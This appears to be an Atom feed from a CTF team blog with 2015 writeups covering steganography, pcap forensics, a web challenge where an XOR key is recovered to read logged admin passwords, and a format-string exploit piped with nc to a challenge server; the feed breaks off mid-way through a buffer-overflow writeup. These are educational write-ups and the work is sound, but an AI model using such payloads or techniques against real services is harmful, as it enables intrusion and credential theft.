<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[GeeksSpeak Team Blog]]></title>
  <link href="http://geeksspeak.github.io/atom.xml" rel="self"/>
  <link href="http://geeksspeak.github.io/"/>
  <updated>2015-04-06T01:54:30+04:30</updated>
  <id>http://geeksspeak.github.io/</id>
  <author>
    <name><![CDATA[GeeksSpeak]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Cooper Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-cooper-writeup/"/>
    <updated>2015-04-06T01:52:15+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-cooper-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Cooper Writeup</strong><br/>
<strong>Point = 300</strong><br/>
<strong>Category = Stegano</strong></p>

<blockquote><p>&ldquo;I am not crazy, my mother had me tested.&rdquo; (Sheldon)</p>

<p>What did Sheldon &hellip; huh sorry, Dr. Cooper really mean?
(<a href="http://quals.nuitduhack.com/challenges/view/14">http://quals.nuitduhack.com/challenges/view/14</a>)</p></blockquote>

<p>The tar zip contains a Windows executable, so the first thing I did was opening it in CFF Explorer.
Doing so I found a picture of Sheldon &hellip; or better say <code>"Dr. Cooper"</code> in resources and a section called .hidden containing a ZIP file.</p>

<p><img src="http://geeksspeak.github.io/files/ctf/ndh2k15/cooper/cooper.bmp" title="khkhkhhhhhh" alt="Sheldon's picture" /></p>

<!--more-->


<p>Within the zip file there was a C++ code project with encrypt and decrypt functions.</p>

<pre><code>&gt; dir Stegano-BMP-master
...
2013-06-21  05:24 PM               533 decrypt.cpp
2015-04-04  12:10 PM    &lt;DIR&gt;          easybmp
2013-06-21  05:24 PM               768 encrypt.cpp
2013-06-21  05:24 PM                28 main.cpp
2013-06-21  05:24 PM               564 Makefile
2013-06-21  05:24 PM               238 README.md
2013-06-21  05:24 PM             2,705 stegano.cpp
2013-06-21  05:24 PM               196 stegano.h
               7 File(s)          5,032 bytes
</code></pre>

<p> First thing that strikes the mind is to compile the project and decrypt (extract) the flag from it, and I did, and I FAILED :(</p>

<pre><code class="`"> &gt;decrypt cooper.bmp
 3
</code></pre>

<p> Obviously <code>3</code> cannot be the flag! (but I did submit it and the server did reject it :))
 So I insepected the files more, and I found a <a href="http://geeksspeak.github.io/pdfFile.pdf">PDF</a> file in the EXE&rsquo;s hex dump.
 I fixed and opened it and finally found &ldquo;my precious&rdquo;!</p>

<p> <img src="http://geeksspeak.github.io/files/ctf/ndh2k15/cooper/flag.jpg" title="StephenHawkingSpentSomeTimeOnSteganoTrolling" alt="tha flag" /></p>

<p>BTW: The <a href="http://geeksspeak.github.io/files/ctf/ndh2k15/cooper/pdfFile.pdf">PDF</a> is password protected which the reader has to guess :D</p>

<p> Written by <strong><a href="http://twitter.com/shabgrd">MMS</a></strong></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Private Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-private-writeup/"/>
    <updated>2015-04-05T15:43:15+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-private-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Private Writeup</strong><br/>
<strong>Point = 100</strong><br/>
<strong>Category = Forensics</strong><br/>
<strong>Description : </strong></p>

<blockquote><p>&ldquo;The quiet you are, the more you are able to ear&rdquo;</p></blockquote>

<p>We&rsquo;ve provided a pcapng file in this challenge. At first glance I thought it may be VoIP challenge because of description but after viewing packets , this assumption goes wrong. there were some STP , CDP and some ICMP packets . after some investigation in packets i found some unusual ICMP packets ! their identification fields were 0 ! all of them ! hmmm. seems somebody generated them manually by a packet generator . so i focused on them to find a pattern .actually their IP headers had a pattern and they were ASCII numbers ! sweet . that&rsquo;s easy . let&rsquo;s have some fun with Scapy .</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>from scapy.all import *
</span><span class='line'>from scapy.utils import rdpcap
</span><span class='line'>flag=""
</span><span class='line'>pkts=rdpcap("private.pcap")
</span><span class='line'>for pkt in pkts:
</span><span class='line'>   if (ICMP in pkt and pkt[ICMP].type==8 and pkt[ICMP].id==0 ):
</span><span class='line'>      flag += chr(pkt[IP].id)
</span><span class='line'>print flag        
</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[NDH CTF 2015 - Updator Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup/"/>
    <updated>2015-04-05T03:28:56+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/05/ndh-ctf-2015-updator-writeup</id>
    <content type="html"><![CDATA[<p><strong>NDH 2015 Updator Writeup</strong><br/>
<strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>Unhackable : &ldquo;Not hackable; that cannot be hacked or broken into.&rdquo;
We manage updates and thus have fixes, this is not a PS3 as it is unhackable &hellip; or is it?
Score     200
Link      <a href="http://updator.challs.nuitduhack.com/">http://updator.challs.nuitduhack.com/</a></p></blockquote>

<p>openning the url gives us a login page and a update button. pressing update button shows an notification:</p>

<blockquote><p>The update managing system is still under construction but will be available soon.</p></blockquote>

<p>We noticed it&rsquo;s a python script <code>update.py</code>. So attempting to loading <code>update.pyc</code> gave us the permission to download the file. Instantly i tried to decompile the code with <code>uncompyle2</code> as:</p>

<!--more-->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ /usr/local/bin/uncompyle2 update.pyc &gt; update.py
</span><span class='line'>$ cat update.py
</span><span class='line'># 2015.04.05 03:00:11 IRDT
</span><span class='line'># Embedded file name: update.py
</span><span class='line'>import config
</span><span class='line'>import sys
</span><span class='line'>KEY = config.KEY
</span><span class='line'>
</span><span class='line'>def xor(*args):
</span><span class='line'>    if len(args) &lt; 2:
</span><span class='line'>        sys.exit(0)
</span><span class='line'>    length = len(args[0])
</span><span class='line'>    for arg in args:
</span><span class='line'>        if len(arg) != length:
</span><span class='line'>            sys.exit(0)
</span><span class='line'>        length = len(arg)
</span><span class='line'>
</span><span class='line'>    cipher = args[0]
</span><span class='line'>    for arg in args[1:]:
</span><span class='line'>        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])
</span><span class='line'>
</span><span class='line'>    return cipher
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>class Crypto:
</span><span class='line'>
</span><span class='line'>    @staticmethod
</span><span class='line'>    def encrypt(file):
</span><span class='line'>        with open(file, 'r') as fd:
</span><span class='line'>            content = fd.read()
</span><span class='line'>        content = content.ljust(len(content) + (8 - len(content) % 8), '0')
</span><span class='line'>        blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
</span><span class='line'>        with open('%s.encrypted' % file, 'w') as fd:
</span><span class='line'>            encrypted = []
</span><span class='line'>            for i in range(len(blocks)):
</span><span class='line'>                if i == 0:
</span><span class='line'>                    encrypted.append(xor(KEY, blocks[i]))
</span><span class='line'>                else:
</span><span class='line'>                    encrypted.append(xor(KEY, blocks[i], encrypted[i - 1]))
</span><span class='line'>
</span><span class='line'>            fd.write(''.join(encrypted))
</span><span class='line'>
</span><span class='line'>    @staticmethod
</span><span class='line'>    def decrypt(file):
</span><span class='line'>        with open(file, 'r') as fd:
</span><span class='line'>            content = fd.read()
</span><span class='line'>        blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
</span><span class='line'>        with open('.'.join(file.split('.')[:-1]), 'w') as fd:
</span><span class='line'>            plain = []
</span><span class='line'>            for i in range(len(blocks)):
</span><span class='line'>                if i == 0:
</span><span class='line'>                    plain.append(xor(KEY, blocks[i]))
</span><span class='line'>                else:
</span><span class='line'>                    plain.append(xor(KEY, blocks[i], blocks[i - 1]))
</span><span class='line'>
</span><span class='line'>            fd.write(''.join(plain).rstrip('0'))
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>print 'Content-Type: text/html'
</span><span class='line'>print '\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;meta charset="UTF-8"&gt;\n    &lt;title&gt;Updator - Update system&lt;/title&gt;\n    &lt;link rel="stylesheet" href="static/font-awesome/css/font-awesome.css"&gt;\n    &lt;link rel="stylesheet" href="static/css/style.css"&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;div id="info"&gt;\n      The update managing system is still under construction but will be available soon.\n    &lt;/div&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n'
</span><span class='line'># okay decompyling update.pyc 
</span><span class='line'># decompiled 1 files: 1 okay, 0 failed, 0 verify failed
</span><span class='line'># 2015.04.05 03:00:11 IRDT</span></code></pre></td></tr></table></div></figure>


<p>This a simple CBC mode XOR encryption. In the meantime my friend figured out that <code>robots.txt</code> tells us we should take look at <code>/temp/</code> directory. there was a file named <code>log.py.encrypted</code>:</p>

<blockquote><p>Index of /temp
[ICO]  Name    Last modified   Size    Description<br/>
[DIR]  Parent Directory        - <br/>
[TXT]  log.py.encrypted    31-Mar-2015 17:35   328      <br/>
Apache/2.2.22 (Debian) Server at 10.0.0.5 Port 80</p></blockquote>

<p>As we saw in the decompiled source the encrypt function encrypts a file and saves as <code>name+.encrypted</code>. So we tried to decrypt the file as my friend did. with this assumption that the first block has <code>import</code> keyword he xor the first block with that and take a some chars for the <code>KEY</code>. remember the CBC mode:
<img src="http://upload.wikimedia.org/wikipedia/commons/8/80/CBC_encryption.svg"/><br/>
We have second block if we calculate <code>encrypted[0] ^ encrypted[1]</code>. So he xored the calculated block and the key he take from the previous part. and there was <code>atetime</code>. So after completing the key we can decrypt the file. ( ofcourse it is not a proper solution as you can use xortool and &hellip; but faster than everything :) thanks to him ;) ). So i managed to decrypt the file using edited above source:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import sys
</span><span class='line'>KEY = '6[@dq"&s'
</span><span class='line'>
</span><span class='line'>def xor(*args):
</span><span class='line'>    if len(args) &lt; 2:
</span><span class='line'>        sys.exit(0)
</span><span class='line'>    length = len(args[0])
</span><span class='line'>    for arg in args:
</span><span class='line'>        if len(arg) != length:
</span><span class='line'>            sys.exit(0)
</span><span class='line'>        length = len(arg)
</span><span class='line'>
</span><span class='line'>    cipher = args[0]
</span><span class='line'>    for arg in args[1:]:
</span><span class='line'>        cipher = ''.join([ chr(ord(arg[i]) ^ ord(cipher[i])) for i in range(len(arg)) ])
</span><span class='line'>
</span><span class='line'>    return cipher
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>def decrypt(file):
</span><span class='line'>    with open(file, 'rb') as fd:
</span><span class='line'>        content = fd.read()
</span><span class='line'>    blocks = [ content[i * 8:(i + 1) * 8] for i in range(len(content) / 8) ]
</span><span class='line'>    with open('.'.join(file.split('.')[:-1]), 'w') as fd:
</span><span class='line'>        plain = []
</span><span class='line'>        for i in range(len(blocks)):
</span><span class='line'>            if i == 0:
</span><span class='line'>                plain.append(xor(KEY, blocks[i]))
</span><span class='line'>            else:
</span><span class='line'>                plain.append(xor(KEY, blocks[i], blocks[i - 1]))
</span><span class='line'>
</span><span class='line'>        fd.write(''.join(plain).rstrip('0'))
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>decrypt('log.py.encrypted')
</span></code></pre></td></tr></table></div></figure>


<p>make sure you use <code>rb</code> to decrypt properly. We have decrypted file as:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>import datetime
</span><span class='line'>
</span><span class='line'>LOG_DIR = 'logs'
</span><span class='line'>
</span><span class='line'>class Logger():
</span><span class='line'>
</span><span class='line'>    @staticmethod
</span><span class='line'>    def log(username, password):
</span><span class='line'>        basename = '%s/%s_%s' % (LOG_DIR, str(datetime.date.today()), username)
</span><span class='line'>        with open(basename, 'a+') as fd:
</span><span class='line'>            fd.write('[%s] Login with password %s\n' % (str(datetime.datetime.today()), password))
</span></code></pre></td></tr></table></div></figure>


<p>there is another directory we should take a look <code>logs</code> no permission:</p>

<blockquote><p>Forbidden<br/>
You don&rsquo;t have permission to access /logs/ on this server.<br/>
Apache/2.2.22 (Debian) Server at 10.0.0.5 Port 80</p></blockquote>

<p>but reading carefully the code gave me the idea to find the exact location:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">datetime</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">date</span><span class="o">.</span><span class="n">today</span><span class="p">())</span>
</span><span class='line'><span class="s">&#39;2015-04-04&#39;</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span> <span class="k">print</span> <span class="s">&quot;</span><span class="si">%s</span><span class="s">/</span><span class="si">%s</span><span class="s">_</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span><span class="p">(</span><span class="s">&quot;logs&quot;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">date</span><span class="o">.</span><span class="n">today</span><span class="p">()),</span> <span class="s">&quot;admin&quot;</span><span class="p">)</span>
</span><span class='line'><span class="n">logs</span><span class="o">/</span><span class="mi">2015</span><span class="o">-</span><span class="mo">04</span><span class="o">-</span><span class="mo">04</span><span class="n">_admin</span>
</span><span class='line'><span class="o">&gt;&gt;&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>opening <code>http://updator.challs.nuitduhack.com/logs/2015-04-04_admin</code> gave me this log:</p>

<blockquote><p>[2015-04-04 18:49:48.839448] Login with password Mpt2P4sse2Ouf
[2015-04-04 18:49:54.044382] Login with password Mot2P4sse2Ouf</p></blockquote>

<p>Second password worked for me and after logging in we have the flag:</p>

<blockquote><p>Well played, here is your flag : zEpbiUFt5p7m84cxOxN6</p></blockquote>

<p>Interesting challenge So we&rsquo;ve got 200pts.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - TEAM Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup/"/>
    <updated>2015-04-03T03:16:39+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 TEAM Writeup</strong><br/>
<strong>Point = 600</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>There is a wierd kind of authentication service running: nc hack.bckdr.in 8004. The binary can be found here. The vampire says that there is no need for bruteforce.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ file team
</span><span class='line'>team: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb6836dc9249bd1e7c33e023d563ff429d7dca4, stripped
</span><span class='line'>$ checksec.sh --file team
</span><span class='line'>RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
</span><span class='line'>Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   team
</span></code></pre></td></tr></table></div></figure>


<p>Ok looking into the binary in IDA shows us two function <code>0x08048769</code> and <code>0x080486ad</code> are important to us. the first one can be seen bellow:</p>

<!--more-->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>int sub_8048769()
</span><span class='line'>{
</span><span class='line'>  const char *v0; // ST18_4@1
</span><span class='line'>  const char *v1; // ST1C_4@1
</span><span class='line'>
</span><span class='line'>  v0 = (const char *)malloc(0xC8u);
</span><span class='line'>  v1 = (const char *)malloc(0x64u);
</span><span class='line'>  printf("Enter teamname: ");
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  __isoc99_scanf("%200s", v0);
</span><span class='line'>  printf("Enter flag: ");
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  __isoc99_scanf("%100s", v1);
</span><span class='line'>  sleep(2u);
</span><span class='line'>  sub_80486AD(v0, v1);
</span><span class='line'>  free((void *)v0);
</span><span class='line'>  free((void *)v1);
</span><span class='line'>  return 0;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>As you can see there is no potential flaw so we skip to second one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>signed int __cdecl sub_80486AD(const char *a1, const char *a2)
</span><span class='line'>{
</span><span class='line'>  signed int result; // eax@2
</span><span class='line'>  int v3; // edx@7
</span><span class='line'>  FILE *stream; // [sp+24h] [bp-74h]@1
</span><span class='line'>  char s; // [sp+28h] [bp-70h]@3
</span><span class='line'>  int v6; // [sp+8Ch] [bp-Ch]@1
</span><span class='line'>
</span><span class='line'>  v6 = *MK_FP(__GS__, 20);
</span><span class='line'>  stream = fopen("flag.txt", "r");
</span><span class='line'>  if ( stream )
</span><span class='line'>  {
</span><span class='line'>    fgets(&s, 100, stream);
</span><span class='line'>    printf(a1);
</span><span class='line'>    if ( !strcmp(&s, a2) )
</span><span class='line'>      puts(" : correct flag!");
</span><span class='line'>    else
</span><span class='line'>      puts(" : incorrect flag. Try again.");
</span><span class='line'>    fclose(stream);
</span><span class='line'>    result = 0;
</span><span class='line'>  }
</span><span class='line'>  else
</span><span class='line'>  {
</span><span class='line'>    result = 1;
</span><span class='line'>  }
</span><span class='line'>  v3 = *MK_FP(__GS__, 20) ^ v6;
</span><span class='line'>  return result;
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>interesting! in this function flag.txt will be opened and read but the important part is <code>printf(a1);</code>. remember previous function <code>a1</code> is the <code>v0</code> var which have the teamname! So there is a <em>Format String Vulnerability</em>. And the abuse is pretty simple, just printing the stack addresses to leak the flag:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ cat 5
</span><span class='line'>%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
</span><span class='line'>A
</span><span class='line'>
</span><span class='line'>$ cat 5 | nc hack.bckdr.in 8004
</span><span class='line'>Enter teamname: Enter flag: 0x640x9dd11400xf770ec20(nil)0x10x9dd10d80x9dd10080xf773855c0x9dd11400x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x626631370x80483000x1(nil)0x1(nil)(nil)0xff8b30880xf772b5000x10x5fc69000(nil)(nil)0xff8b3088 : incorrect flag. Try again.</span></code></pre></td></tr></table></div></figure>


<p>you can see that</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>0x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x62663137</span></code></pre></td></tr></table></div></figure>


<p>is our flag. using python <code>struct</code> module for all gives us this one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[redacted]</span></code></pre></td></tr></table></div></figure>


<p>which added 600pts to our points.</p>

<p>HAMIDx9</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Backdoor CTF 2015 - FORGOT Writeup]]></title>
    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup/"/>
    <updated>2015-04-03T02:57:55+04:30</updated>
    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-forgot-writeup</id>
    <content type="html"><![CDATA[<p><strong>Backdoor 2015 FORGOT Writeup</strong><br/>
<strong>Point = 200</strong><br/>
<strong>Category = Exploit</strong></p>

<blockquote><p>Fawkes has been playing around with Finite State Automaton lately. While exploring the concept of implementing regular expressions using FSA he thought of implementing an email-address validator.<br/>
Recently, Lua started to annoy Fawkes. To this, Fawkes, challenged Lua to a battle of wits. Fawkes promised to reward Lua, only if she manages to transition to a non-reachable state in the FSA he implemented. The replication can be accessed here.</p></blockquote>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ file forgot
</span><span class='line'>forgot: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=35930a2d9b048236694e9611073b759e1c88b8c4, stripped</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ ./forgot 
</span><span class='line'>What is your name?
</span><span class='line'>&gt; AAAAAAAAA
</span><span class='line'>
</span><span class='line'>Hi AAAAAAAAA
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>                        Finite-State Automaton
</span><span class='line'>
</span><span class='line'>I have implemented a robust FSA to validate email addresses
</span><span class='line'>Throw a string at me and I will let you know if it is a valid email address
</span><span class='line'>
</span><span class='line'>                                Cheers!
</span><span class='line'>
</span><span class='line'>I should give you a pointer perhaps. Here: 8048654
</span><span class='line'>
</span><span class='line'>Enter the string to be validate
</span><span class='line'>&gt; AAAAAAAAAAAAAAAAAA
</span><span class='line'>Dude, you seriously think this is going to work. Where are the fancy @ and [dot], huh?</span></code></pre></td></tr></table></div></figure>


<p>without loosing time opening the binary into IDA shows us several functions but the General function to this functionality is <code>0x08047AA</code>. lets see the psuedo-code :</p>

<!--more-->


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>...
</span><span class='line'>  puts("What is your name?");
</span><span class='line'>  printf("&gt; ");
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  fgets((char *)&v19, 32, stdin);
</span><span class='line'>  sub_80485DD(&v19);
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  printf("I should give you a pointer perhaps. Here: %x\n\n", sub_8048654);
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  puts("Enter the string to be validate");
</span><span class='line'>  printf("&gt; ");
</span><span class='line'>  fflush(stdout);
</span><span class='line'>  __isoc99_scanf("%s", &v8);
</span><span class='line'>  for ( i = 0; ; ++i )
</span><span class='line'> ...</span></code></pre></td></tr></table></div></figure>


<p>This is the interesting part since we have control on inputs. <code>v19</code> is a 32 char buffer so no vulnerabilty is there. but what about <code>__isoc99_scanf("%s", &amp;v8);</code> ? obviously using <em>scanf</em> in such a manner is exteremly dangerous. <code>v8</code> also is a 32 char buffer. so it is also another stack buffer overflow like <code>ECHO</code>. lets check this condition :</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
